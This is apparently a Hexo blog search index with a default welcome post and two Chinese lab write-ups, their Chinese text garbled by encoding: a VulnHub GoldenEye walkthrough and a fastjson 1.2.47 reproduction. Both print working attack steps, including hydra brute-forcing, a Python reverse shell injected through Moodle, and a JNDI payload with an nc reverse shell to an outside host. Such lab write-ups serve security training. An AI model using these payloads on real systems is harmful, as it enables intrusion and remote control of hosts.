<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/09/07/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>VulnHub-GoldenEye</title>
    <url>/2024/07/15/VulnHub-GoldenEye/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é¶æœºæ¢æµ‹"><a href="#é¶æœºæ¢æµ‹" class="headerlink" title="é¶æœºæ¢æµ‹"></a>é¶æœºæ¢æµ‹</h2><p>é¦–å…ˆä½¿ç”¨nmapæ¢æµ‹ä¸€ä¸‹é¶æœºçš„IPåœ°å€<br><code>nmap 192.168.206.124/24</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00013s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">25</span>/tcp <span class="token function">open</span>  smtp
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿›ä¸€æ­¥æ¢æµ‹é¶æœºä¿¡æ¯</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
â””â”€<span class="token comment"># nmap 192.168.206.167 -p- -sS -A</span>
Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 <span class="token number">15</span>:30 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0012s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65531</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE  VERSION
<span class="token number">25</span>/tcp    <span class="token function">open</span>  smtp     Postfix smtpd
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_smtp-commands: ubuntu, PIPELINING, SIZE <span class="token number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>ubuntu
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:22:34
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-21T03:22:34
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http     Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: GoldenEye Primary Admin Server
<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token number">55006</span>/tcp <span class="token function">open</span>  ssl/pop3 Dovecot pop3d
<span class="token operator">|</span>_pop3-capabilities: AUTH-RESP-CODE SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> <span class="token environment constant">USER</span> RESP-CODES CAPA PIPELINING TOP UIDL
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52
<span class="token number">55007</span>/tcp <span class="token function">open</span>  pop3     Dovecot pop3d
<span class="token operator">|</span>_pop3-capabilities: RESP-CODES PIPELINING SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> AUTH-RESP-CODE <span class="token environment constant">USER</span> CAPA STLS TOP UIDL
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52
MAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.16</span> ms <span class="token number">192.168</span>.206.167

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">39.75</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è®¿é—®80ç«¯å£ï¼š<br><img src="https://i-blog.csdnimg.cn/direct/123a06efaa7e49b09979a699a3c2e1f0.png" alt=" "></p>
<p><a href="http://192.168.206.167/sev-home/%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%AA%97%E5%8F%A3">http://192.168.206.167/sev-home/æ˜¯ä¸€ä¸ªç™»å½•çª—å£</a><br>æŸ¥çœ‹æºç å‘ç°ä¸€ä¸ªjsæ–‡ä»¶<br><img src="https://i-blog.csdnimg.cn/direct/b862e7b669b5483cb9ed5c188ea8f484.png" alt=" "></p>
<p>å­˜åœ¨ä¸€æ®µå¯†æ–‡:<br><code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code><br>è§£å¯†ä¹‹åå¾—åˆ°:<br><code>InvincibleHack3r</code></p>
<h2 id="å¯†ç æš´ç ´"><a href="#å¯†ç æš´ç ´" class="headerlink" title="å¯†ç æš´ç ´"></a>å¯†ç æš´ç ´</h2><p>é‚£ä¹ˆç»“åˆå‡ºç°çš„ä¸¤ä¸ªç”¨æˆ·å<code>Boris</code>å’Œ<code>Natalya</code>ï¼Œå°è¯•ä¸€ä¸‹çˆ†ç ´è´¦å¯†ç™»å½•åˆšæ‰çš„ç™»å½•å£ï¼Œå¤§å°å†™éƒ½è¯•è¯•ã€‚<br><code>boris/InvincibleHack3r</code>ç™»å½•æˆåŠŸï¼Œçœ‹åˆ°æç¤ºï¼š</p>
<p><img src="https://i-blog.csdnimg.cn/direct/e5d4296a06e5446b9270f6316e514960.png" alt=" "></p>
<p>å¯çŸ¥ä¸‹é¢å°±æ˜¯é’ˆå¯¹55007ç«¯å£å•¦<br>ä½¿ç”¨ä¹å¤´è›‡è¿›è¡Œçˆ†ç ´:<br><code>hydra -L GodenEye.txt  -P /usr/share/wordlists/fasttrack.txt 192.168.206.167 -s 55007 pop3</code></p>
<p><img src="https://i-blog.csdnimg.cn/direct/7b22633e017a4bf7990cdc8bbe653053.png" alt=" "></p>
<h2 id="popæœåŠ¡è®¿é—®"><a href="#popæœåŠ¡è®¿é—®" class="headerlink" title="popæœåŠ¡è®¿é—®"></a>popæœåŠ¡è®¿é—®</h2><p>pop3ç™»å½•ä¾‹å­ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># telnet $ip 110</span>
 +OK beta POP3 server <span class="token punctuation">(</span>JAMES POP3 Server <span class="token number">2.3</span>.2<span class="token punctuation">)</span> ready 
 <span class="token environment constant">USER</span> billydean    
 +OK
 PASS password
 +OK Welcome billydean
 
 list
 
 +OK <span class="token number">2</span> <span class="token number">1807</span>
 <span class="token number">1</span> <span class="token number">786</span>
 <span class="token number">2</span> <span class="token number">1021</span>

 retr <span class="token number">1</span>
 
 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login <span class="token keyword">for</span> remote desktop <span class="token punctuation">..</span>. try not to forget it this time<span class="token operator">!</span>
 username: billydean
 password: PA<span class="token variable">$$</span>W0RD<span class="token operator">!</span>Z
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æŒ¨ä¸ªè®¿é—®ï¼Œnatalyaç”¨æˆ·æœ‰2ä¸ªé‚®ä»¶ï¼š</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for &lt;natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: &lt;20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>borisæœ‰3ä¸ªé‚®ä»¶ï¼š</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for &lt;boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for &lt;boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for &lt;boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ ¹æ®é‚®ä»¶ä¿¡æ¯å¾—åˆ°ä¸€ä¸ªç½‘ç«™çš„è´¦å·å¯†ç <br>username: xenia<br>password: RCP90rulez!<br>å…ˆæ”¹ä¸€ä¸‹hostæ–‡ä»¶ï¼Œç™»å½•æˆåŠŸï¼<br>ç™»å½•ä¹‹åå¾—åˆ°çš„ä¿¡æ¯å¦‚ä¸‹ï¼š<br>1ã€å­˜åœ¨adminã€doakç”¨æˆ·<br>2ã€cmsç‰ˆæœ¬ä¸ºmoodle2.2.3<br>çˆ†ç ´doakçš„å¯†ç ä¸ºgoatï¼ŒæŸ¥çœ‹é‚®ä»¶ä¿¡æ¯ï¼š</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for &lt;doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: &lt;20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä½¿ç”¨ä¸Šé¢çš„è´¦å¯†ç™»å½•ç½‘ç«™ï¼Œç™»å½•ä¹‹åå‘ç°æ–‡ä»¶<br><img src="https://i-blog.csdnimg.cn/direct/fbae555517114be5b51371fda2557e10.png" alt=" "></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸‹è½½æ–‡ä»¶ä¹‹ååœ¨å›¾ç‰‡å±æ€§é‡Œçœ‹åˆ°ä¸€æ®µå¯†æ–‡ï¼šeFdpbnRlcjE5OTV4IQ&#x3D;&#x3D;&#x2F;xWinter1995x!<br><img src="https://i-blog.csdnimg.cn/direct/77c32edab5f54859b875711a7fbde2b2.png" alt=" "><br>å°è¯•ç™»é™†ä¸€ä¸‹admin&#x2F;xWinter1995x!</p>
<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æœç´¢moodle2.2.3æ¼æ´è¿›è¡Œå¤ç°<br><img src="https://i-blog.csdnimg.cn/direct/e8549cd137144605b50eecc0b2d4899a.png" alt=" "><br>ç„¶ååœ¨è¿™é‡Œè¾“å…¥åå¼¹shell<br><img src="https://i-blog.csdnimg.cn/direct/ae4847e514f74bc1b5eb8c2bd6934ef2.png" alt=" "><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.206.138&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code><br>ç„¶åç¼–è¾‘ä¸€ç¯‡æ–‡ç« <br><img src="https://i-blog.csdnimg.cn/direct/5d08efbe22234070bb5406f329e80380.png" alt=" "><br>æ‹¿åˆ°shellã€‚</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¿›è¡Œä¿¡æ¯æ”¶é›†å‘ç°å†…æ ¸ç‰ˆæœ¬ä¸º3.13.0ï¼Œ<a href="https://www.exploit-db.com/exploits/37292">ææƒè„šæœ¬</a><br>æ³¨æ„å°†è„šæœ¬ä¸­çš„gccæ”¹ä¸ºccåç¼–è¯‘è¿›è¡Œææƒ<br><img src="https://i-blog.csdnimg.cn/direct/9bad6b668e594226828d3d28ef586805.png" alt=" "></p>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson-æ¼æ´å¤ç°</title>
    <url>/2024/03/29/fastjson-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å€ŸåŠ©<a href="https://github.com/lemono0/FastJsonParty">FastJsonParty</a>é¶åœºè¿›è¡Œä¸€ä¸‹fastjsonä¸€äº›ç‰ˆæœ¬æ¼æ´çš„å¤ç°</p>
<h2 id="1-2-47-jndiï¼ˆå‡ºç½‘ï¼‰"><a href="#1-2-47-jndiï¼ˆå‡ºç½‘ï¼‰" class="headerlink" title="1.2.47-jndiï¼ˆå‡ºç½‘ï¼‰"></a>1.2.47-jndiï¼ˆå‡ºç½‘ï¼‰</h2><p>æˆ‘ä½¿ç”¨è‡ªå·±çš„æœåŠ¡å™¨æ­å»ºçš„é¶åœºï¼Œè®¿é—®ç™»é™†é¡µé¢ä¹‹åæŠ“åŒ…ç™»å½•æ•°æ®ï¼Œ ä¼ å…¥çš„æ•°æ®ä¸ºjsonæ ¼å¼<br><img src="https://img-blog.csdnimg.cn/direct/8ebff2e5677546d1bdce8f33dbaf2330.png" alt="123"></p>
<p>å°è¯•è®©å…¶è¿›è¡ŒæŠ¥é”™ï¼Œæ¯”å¦‚è¯´åˆ é™¤ä¸€ä¸ª<code>&#125;</code>,<code>&quot;</code><br>æŠ¥é”™æ•°æ®</p>
<pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 500 
Content-Type: application&#x2F;json
Date: Thu, 28 Mar 2024 03:48:20 GMT
Connection: close
Content-Length: 160

&#123;&quot;timestamp&quot;:&quot;2024-03-28T03:48:20.909+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;syntax error, position at 0, name password&quot;,&quot;path&quot;:&quot;&#x2F;login&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ ‡å‡†çš„fastjsoné”™è¯¯æç¤ºï¼Œç¡®å®šåç«¯ä½¿ç”¨äº†fastjsonã€‚<br>ä½¿ç”¨dnslogæµ‹è¯•ä¸€ä¸‹</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/f7a9c69af6054630a3a16340ddf783d6.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/direct/e6b51ba169b64038a26eb9975355f52b.png" alt="123"></p>
<p>ä¹Ÿæ”¶åˆ°äº†è¯·æ±‚ï¼Œè¯´æ˜å­˜åœ¨æ¼æ´ã€‚æ­¤æ—¶æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“å­˜åœ¨çš„æ¼æ´ç‰ˆæœ¬<br>å¼€å§‹æ¢æµ‹fastjsonçš„ç²¾ç¡®ç‰ˆæœ¬</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çœ‹å‡ºç‰ˆæœ¬ä¸º1.2.47<br><img src="https://img-blog.csdnimg.cn/direct/5dfcf1c427b242cb8d23826b92d52430.png" alt="123"><br>åˆ©ç”¨mappingsç¼“å­˜æœºåˆ¶ï¼ŒJdbcRowSetImplæ‰“jndiï¼Œä½†å‰ææ˜¯éœ€è¦æœºå™¨å‡ºç½‘ã€‚å…³äºè¿™ç§æ–¹å¼æ¢æµ‹fastjosnç‰ˆæœ¬ï¼Œæ¡ä»¶æ˜¯éœ€è¦responseä¸­ä¼šå›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œä½†å®é™…ç¯å¢ƒå¯èƒ½å­˜åœ¨ä¸å›æ˜¾çš„æƒ…å†µï¼Œé‚£å°±éœ€è¦åˆ©ç”¨å…¶ä»–æ‰‹æ®µäº†ï¼Œå¦‚dnslogã€ddosç­‰é—´æ¥åˆ¤æ–­ã€‚<br>ä½¿ç”¨jndiæ³¨å…¥å·¥å…·<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit-1.0-SNAPSHOT-all</a>ã€‚å¯ä»¥ä½¿ç”¨ncåå¼¹shellã€‚<br>å°†è¯¥å·¥å…·ä¸Šä¼ åˆ°kaliï¼Œå¼€å¯æœåŠ¡</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token number">123.60</span>.157.194 <span class="token parameter variable">-C</span> <span class="token string">"nc 123.60.157.194 9999 -e sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/7a76d0a9874f461f876d9a0ceef3fbfb.png" alt="123"><br>ç„¶åæœåŠ¡å™¨å†ç›‘å¬ä¸€ä¸ªç«¯å£9999</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/2kgqlp"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>sendä¹‹åå°±ä¼šæ¥æ”¶åˆ°shell<br><img src="https://img-blog.csdnimg.cn/direct/645b700e502a4db2a1a06ef697d7ccd7.png" alt="456"><br>åœ¨å¤ç°è¿‡ç¨‹ä¸­æˆ‘ä½¿ç”¨äº†windowsè¿›è¡Œå¼€å¯æœåŠ¡ï¼Œä¸€ç›´å‡ºç°ä»¥ä¸‹æŠ¥é”™ï¼š<br><img src="https://img-blog.csdnimg.cn/direct/ff477a4244144e31a265665610b55639.png" alt="456"><br>åŸå› å°±æ˜¯1389å·²ç»è¢«å ç”¨ï¼Œå°è¯•äº†å‡ æ¬¡æ›´æ¢kaliä¹‹åå°±å¯ä»¥æ­£å¸¸æ‰“äº†ã€‚</p>
<h2 id="1247-jndi-waf"><a href="#1247-jndi-waf" class="headerlink" title="1247-jndi-waf"></a>1247-jndi-waf</h2><h3 id="æ£€æµ‹æ˜¯å¦æ˜¯fastjsonçš„æ–¹æ³•"><a href="#æ£€æµ‹æ˜¯å¦æ˜¯fastjsonçš„æ–¹æ³•" class="headerlink" title="æ£€æµ‹æ˜¯å¦æ˜¯fastjsonçš„æ–¹æ³•"></a>æ£€æµ‹æ˜¯å¦æ˜¯fastjsonçš„æ–¹æ³•</h3><p>1ã€å»æ‰<code>&#125;</code>æˆ–<code>&quot;</code></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"ad"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ad"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2ã€dnslogæ¢æµ‹</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
